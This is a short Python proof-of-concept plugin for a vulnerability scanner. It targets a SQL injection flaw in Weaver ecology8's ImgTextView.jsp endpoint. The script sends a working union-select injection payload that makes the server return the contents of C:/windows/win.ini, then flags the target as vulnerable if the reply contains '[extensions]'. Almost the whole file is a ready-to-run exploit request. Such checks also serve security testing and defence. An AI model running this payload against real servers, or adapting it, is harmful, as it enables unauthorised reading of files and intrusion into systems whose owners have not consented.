#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology8 social sql inject'
        self.keyword = ['ecology8', 'sql inject']
        self.info = 'ecology8 social sql inject'
        self.type = 'inject'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path +"social/im/ImgTextView.jsp?url=/weaver/weaver.file.SignatureDownLoad&markId=-1%20union(select%20%27C%3A%2Fwindows%2Fwin.ini%27%20from%20v%24instance)"
                    async with session.get(url=url) as res:
                        if res!=None:
                            text = await res.text()
                            if '[extensions]' in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "ecology8 inject"})
                                return